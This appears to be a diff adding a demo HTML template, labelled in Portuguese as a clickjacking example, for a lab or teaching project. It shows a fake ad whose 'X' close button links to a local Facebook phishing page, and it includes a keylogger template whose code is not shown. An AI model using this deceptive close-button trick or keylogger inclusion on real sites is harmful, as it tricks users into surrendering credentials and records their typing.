@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exemplo de Clickjacking Refinado</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+        }
+
+        .ad-container {
+            position: relative;
+            width: 300px;
+            height: 200px;
+            background-color: white;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            padding-top: 30px;
+        }
+
+        .ad-container h1 {
+            margin: 0;
+            font-size: 18px;
+            padding: 20px;
+        }
+
+        .close-button {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            width: 20px;
+            height: 20px;
+            background-color: red;
+            color: white;
+            font-size: 14px;
+            line-height: 20px;
+            text-align: center;
+            cursor: pointer;
+            z-index: 10;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="ad-container">
+        <a href="http://127.0.0.1:8000/phising_facebook" class="close-button">X</a>
+        <h1>Propaganda Chata Número 1</h1>
+    </div>
+
+    {% include 'keylogger.html' %}
+</body>
+</html>
